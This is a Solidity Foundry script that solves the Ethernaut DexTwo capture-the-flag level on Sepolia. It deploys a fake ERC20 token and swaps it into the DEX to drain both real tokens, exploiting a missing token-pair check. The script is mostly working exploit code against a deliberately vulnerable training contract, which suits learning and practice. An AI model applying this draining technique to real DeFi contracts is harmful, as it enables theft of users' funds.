// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/DexTwo.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

/*
    Solution script for the Ethernaut Level 23: DexTwo

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in DexTwoScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/DexTwo.s.sol:DexTwoScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/DexTwo.s.sol/11155111
*/

contract FakeToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("FakeToken", "FTN") public {
        _mint(msg.sender, initialSupply);
    }
}


contract DexTwoScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0xf2464FD476878EC3189994C3059b2aBEb05C96bd);
    DexTwo level23 = DexTwo(instance);

    function run() external {
        vm.startBroadcast();

        /*
            Source: https://blog.dixitaditya.com/ethernaut-level-23-dex-two?source=more_series_bottom_blogs

            The vulnerabilities is due to a missing validation in the Dex swap function as follows:

            require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

            Since this is missing we can swap the tokens in the Dex with any tokens we like - even fake tokens 
            that we create!
        */

        // store addresses of the legitimate DexTwo tokens 
        address token1 = level23.token1();
        address token2 = level23.token2();

        // Create our own fake token and mint 400 to the attacker
        FakeToken fake = new FakeToken(400);
        address fakeToken = address(fake);

        // confirm attacker holds 400 FTN 
        require(fake.balanceOf(msg.sender) == 400, "attacker doesn't hold 400 FTN");

        /* 
            Transfer 100 FTN to DexTwo so that the price ratio is balanced to 1:1 when swapping.

            Snapshot of current token distrubution

            Dex Two			        User		
            token1	token2	FTN	    token1	token2	FTN
            100	    100	    100	    10      10      300
        */
        fake.transfer(instance, 100);
        require(fake.balanceOf(instance) == 100, "dex doesn't hold 100 FTN");

        // approve the dex to spend attackers remaining FTN
        fake.approve(instance, 300);

        /* 
            Swap 100 ZTN with token1. This will drain all the token1 from the Dex Two.

            Dex Two			        User		
            token1	token2	FTN	    token1	token2	FTN
            0	    100	    200	    110	    10	    200
        */
        level23.swap(fakeToken, token1, 100);

        /*
            According to the swap formula in DexTwo, to get all the token2 from the Dex,
            we need - 100 = (x * 100)/200 - x = 200 ZTN

            Dex Two			        User		
            token1	token2	FTN	    token1	token2	FTN
            0	    0	    400	    110	    110	    0
        */
        level23.swap(fakeToken, token2, 200);

        require(level23.balanceOf(token1, instance) == 0, 'token1 was not drained from dex');
        require(level23.balanceOf(token2, instance) == 0, 'token2 was not drained from dex');

        // console.log("Remaining token1 balance : ", level23.balanceOf(token1, instance));
        // console.log("Remaining token2 balance : ", level23.balanceOf(token2, instance));

        vm.stopBroadcast();
    }
}